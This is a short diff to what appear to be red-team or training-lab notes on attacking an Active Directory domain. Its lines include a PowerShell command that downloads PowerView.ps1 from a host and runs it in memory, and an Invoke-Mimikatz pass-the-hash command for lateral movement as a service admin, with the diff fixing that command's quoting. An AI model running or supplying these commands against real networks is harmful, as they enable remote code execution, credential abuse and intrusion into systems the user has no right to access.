@@ -69,4 +69,4 @@ Dowload Powerview.ps1 and execute in-memory:
 iex (iwr http://172.16.100.36:8080/PowerView.ps1 -UseBasicParsing)
 
 Overpass the hash using mimikatz for lateral movement:
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash goes here> /run:powershell.exe
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash goes here> /run:powershell.exe"'
